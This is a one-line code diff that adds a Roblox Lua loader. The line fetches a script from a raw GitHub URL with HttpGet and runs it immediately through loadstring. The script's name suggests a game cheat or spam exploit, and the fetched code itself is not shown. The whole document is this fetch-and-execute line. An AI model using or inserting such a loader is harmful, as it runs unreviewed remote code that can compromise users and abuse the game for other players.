@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/roaring-knight-crimson-chronicles-asym-spam3-jkb18z7po25cbo.lua"))()
